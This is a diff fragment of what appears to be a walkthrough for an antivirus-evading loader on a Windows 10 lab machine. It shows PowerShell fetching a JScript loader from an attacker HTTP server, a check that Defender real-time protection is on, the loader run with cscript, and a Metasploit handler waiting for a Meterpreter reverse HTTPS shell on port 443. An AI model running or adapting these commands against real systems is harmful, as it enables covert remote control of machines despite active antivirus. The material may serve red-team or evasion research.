@@ -149,12 +149,20 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 PS C:\temp> wget -URI http://192.168.1.30:8080/loaderjfc  -OutFile loaderjfc
 
+PS C:\temp>  Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 06/01/2023 04:45:23
+
+
 PS C:\temp> cmd
 Microsoft Windows [Version 10.0.19044.2364]
 (c) Microsoft Corporation. All rights reserved.
 
 C:\temp>
-
 C:\temp> cscript //E:jscript loaderjfc
 Microsoft (R) Windows Script Host Version 5.812
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -165,11 +173,8 @@ Step 5 - Enjoy the Meterpreter reverse shell running on the target Windows 10 la
 ------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443;
-set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"[sudo] password for jeff: 
-
-[!] The following modules were loaded with warnings:
-[!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
-[!] Please see /root/.msf4/logs/framework.log for details.
+set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"
+[sudo] password for jeff: 
                                                   
   +-------------------------------------------------------+
   |  METASPLOIT by Rapid7                                 |
